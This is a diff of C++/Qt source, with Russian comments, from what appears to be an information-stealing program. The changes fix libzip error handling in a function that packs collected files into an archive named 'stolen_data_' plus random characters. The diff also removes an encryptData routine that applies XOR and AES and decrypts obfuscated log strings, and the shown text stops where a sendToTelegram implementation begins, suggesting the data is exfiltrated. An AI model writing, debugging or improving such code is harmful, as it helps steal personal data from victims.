@@ -1564,13 +1564,12 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     }
 
     std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
-    zip_error_t err;
-    zip_error_init(&err); // Инициализация структуры ошибки
+    zip_error_t err;  // Убираем zip_error_init, так как zip_open сам инициализирует err
 
     // Открытие архива с передачей указателя на zip_error_t
     zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
     if (!zip) {
-        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::fromStdString(zip_error_strerror(&err)));
+        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(&err)));  // Исправлено: передаём &err
         zip_error_fini(&err);
         return "";
     }
@@ -1585,14 +1584,14 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
         zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, -1);
         if (!source) {
             emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " + 
-                    QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
+                    QString(zip_error_strerror(zip_get_error(zip))));
             continue;
         }
 
         std::string fileName = std::filesystem::path(filePath).filename().string();
         if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
             emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName) + ": " + 
-                    QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
+                    QString(zip_error_strerror(zip_get_error(zip))));
             zip_source_free(source);
             continue;
         }
@@ -1606,9 +1605,15 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
         return "";
     }
 
+    // Сохраняем ошибку перед закрытием, чтобы избежать UB после zip_close
+    zip_error_t closeErr;
+    zip_error_init(&closeErr);
     if (zip_close(zip) < 0) {
-        emitLog("Ошибка закрытия ZIP-архива: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
-        zip_discard(zip); // Отмена изменений при ошибке закрытия
+        zip_error_t* zipErr = zip_get_error(zip);  // Получаем ошибку до закрытия
+        zip_error_set(&closeErr, zip_error_code_zip(zipErr), zip_error_code_system(zipErr));  // Копируем ошибку
+        emitLog("Ошибка закрытия ZIP-архива: " + QString(zip_error_strerror(&closeErr)));
+        zip_discard(zip);  // Отбрасываем изменения
+        zip_error_fini(&closeErr);
         zip_error_fini(&err);
         return "";
     }
@@ -1616,35 +1621,6 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     zip_error_fini(&err); // Очистка после успешного завершения
     emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
     return zipPath;
-}
-
-// Реализация encryptData
-std::string MainWindow::encryptData(const std::string& data) {
-    emitLog(QString::fromStdString(decryptString(encryptedLogMessage, 0)) + "Шифрование данных...");
-
-    if (encryptionKey1.empty() || encryptionKey2.empty() || encryptionSalt.empty()) {
-        generateEncryptionKeys();
-    }
-
-    std::array<unsigned char, 16> key1 = GetEncryptionKey(true);
-    std::array<unsigned char, 16> key2 = GetEncryptionKey(false);
-    std::array<unsigned char, 16> iv = generateIV();
-
-    QByteArray dataByteArray(data.c_str(), static_cast<int>(data.size()));
-    QByteArray xorData = applyXOR(dataByteArray, key1);
-
-    QByteArray aesData = applyAES(xorData, key2, iv);
-    if (aesData.isEmpty()) {
-        emitLog(QString::fromStdString(decryptString(encryptedLogMessage, 0)) + "Не удалось зашифровать данные с помощью AES");
-        return "";
-    }
-
-    std::string result;
-    result.append(reinterpret_cast<const char*>(iv.data()), iv.size());
-    result.append(aesData.constData(), aesData.size());
-
-    emitLog(QString::fromStdString(decryptString(encryptedSuccessMessage, 0)) + ": Данные зашифрованы, размер: " + QString::number(result.size()));
-    return result;
 }
 
 // Реализация sendToTelegram
